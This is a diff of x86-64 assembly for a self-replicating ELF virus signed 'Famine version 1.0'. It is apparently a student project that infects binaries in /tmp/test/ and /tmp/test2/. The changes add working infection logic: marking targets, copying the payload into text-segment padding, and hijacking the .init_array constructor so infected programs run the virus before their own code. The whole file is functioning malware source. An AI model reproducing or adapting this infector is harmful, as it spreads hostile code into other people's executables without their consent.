@@ -2,20 +2,37 @@ BITS 64
 
 %include "defines.s"
 virus_len equ _end - _start
-virus_lenq equ (_end - _start) / 8 + 1
+virus_lenq equ (virus_len) / 8 + 1
 
 section .text
     global _start
+
+; [rsp]     cwd_fd
 _start:
+    push    rbx
     push    rbp
     mov     rbp, rsp
+    sub     rsp, 0x10
+    lea     rdi, [rel cwd]
+    mov     rsi, O_DIRECTORY | O_RDONLY
+    xor     eax, eax
+    add     eax, SYS_OPEN
+    syscall
+    mov     [rsp], eax
     lea     rdi, [rel dir1]
     call    readdir
     lea     rdi, [rel dir2]
     call    readdir
-    xor     rdi, rdi
-    mov     eax, SYS_EXIT
+    mov     edi, [rsp]
+    mov     eax, SYS_FCHDIR
     syscall
+    mov     edi, [rsp]
+    xor     eax, eax
+    add     eax, SYS_CLOSE
+    syscall
+    leave
+    pop     rbx
+    jmp     [rel init_ptr]
 
 ; [rsp]         fd
 ; [rsp + 0x4]   buf_len
@@ -148,9 +165,6 @@ right_type_check:
     test    rax, rax
     je      close_quit_infect
     mov     [rsp + map], rax
-    mov     edi, [rsp + fd]
-    mov     eax, SYS_CLOSE
-    syscall
 
     mov     rax, [rsp + map]
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
@@ -224,9 +238,13 @@ check_text_padding:
     jle     remap_and_infect_data
 
     mov     rax, [rsp + text_phdr]
-    mov     rdi, [rsp + map]
-    add     rdi, [rax + p_offset]
+    mov     rdi, [rax + p_offset]
     add     rdi, [rax + p_filesz]
+    add     rdi, [rsp + map]
+    mov     rsi, [rax + p_vaddr]
+    add     rsi, [rax + p_memsz]
+    mov     [rsp + payload_base_address], rsi
+    mov     [rsp + payload_base_offset], rdi
     lea     rsi, [rel _start]
     mov     rcx, virus_lenq
 copy_payload:
@@ -247,9 +265,19 @@ remap_and_infect_data:
     mov     rdx, data_tmp_text.len
     mov     eax, SYS_WRITE
     syscall
-    
-hijack_constructor:
 
+hijack_constructor:
+    mov     rax, [rsp + map]
+    mov     rbx, [rsp + init_array_shdr]
+    add     rax, [rbx + sh_offset]
+    mov     rdx, [rax]
+    mov     QWORD [rsp + old_init_func], rdx
+    mov     rdx, [rsp + payload_base_address]
+    mov     [rax], rdx
+    mov     rax, [rsp + payload_base_offset]
+    add     rax, virus_len - 8 ; let's override init_ptr with the old_init_ptr
+    mov     rdx, [rsp + old_init_func]
+    mov     [rax], rdx
 
 munmap_quit_infect:
     mov     rdi, [rsp + map]
@@ -272,8 +300,12 @@ quit_infect:
 
     dir1: db "/tmp/test/", 0
     dir2: db "/tmp/test2/", 0
-    old_entry_code: TIMES 5 db 0
+    cwd: db ".", 0
     signature: db "Famine version 1.0 (c)oded by alagroy-", 0
     data_tmp_text: db "Remapping and infecting .data", 10
         .len: equ $ - data_tmp_text
+    init_ptr: dq _end
 _end:
+    xor     rdi, rdi
+    mov     eax, SYS_EXIT
+    syscall
